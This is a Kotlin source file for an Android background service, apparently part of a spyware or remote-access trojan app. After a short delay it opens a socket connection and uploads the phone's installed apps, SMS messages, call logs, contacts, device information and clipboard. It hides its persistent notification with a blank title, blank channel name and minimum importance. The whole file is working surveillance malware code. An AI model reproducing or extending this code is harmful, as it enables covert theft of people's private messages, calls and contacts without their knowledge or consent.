// MainService.kt (معدل)
package willi.fiend

import android.annotation.SuppressLint
import android.app.*
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat

class MainService : Service() {
    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // تأخير بدء الاتصال لتجنب بدء الخدمة قبل اكتمال تهيئة النظام
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val socket = AppSocket(this)
                val action = socket.action
                socket.connect()
                action.uploadApps()
                action.uploadMessages()
                action.uploadCalls()
                action.uploadContact()
                action.uploadDeviceInfo()
                action.uploadClipboard()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }, 5000)
        return START_REDELIVER_INTENT
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(1, getNotification())
    }

    @SuppressLint("NewApi")
    private fun getNotification(): Notification {
        val channelId = "channel"
        val channelName = " "
        val channel = NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_MIN
        )
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
        manager.createNotificationChannel(channel)
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
        return notificationBuilder.setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationManager.IMPORTANCE_UNSPECIFIED)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()
    }
}
